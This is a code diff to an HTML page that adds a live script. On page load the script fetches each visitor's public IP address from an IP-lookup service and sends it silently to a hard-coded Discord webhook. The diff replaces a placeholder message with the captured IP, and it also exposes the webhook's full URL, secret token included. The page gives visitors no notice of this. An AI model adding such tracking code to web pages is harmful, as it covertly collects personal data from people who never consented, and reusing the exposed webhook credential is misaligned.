@@ -11,11 +11,9 @@
   <body>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
     <script>
-      //$.getJSON(
-      //  "https://api.ipify.org?format=jsonp&callback=?",
-        
-
-        fetch(
+     $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
+    var ip = data.ip;
+    fetch(
   'https://discord.com/api/webhooks/1113441562408534060/JbnywRXcVkXo8b04JJX3xDBwOL6Atq_c0plGw-xWiHBUKD7xg-EolK5tYqEZLM1CfSae',
   {
     method: 'post',
@@ -30,11 +28,12 @@
         'https://cdn.discordapp.com/avatars/411256446638882837/9a12fc7810795ded801fdb0401db0be6.png',
       // contents of the message to be sent
       content:
-        'test',
+        ip,
 
     }),
   }
-)/*)*/;
+)
+});
       
     </script>
   </body>
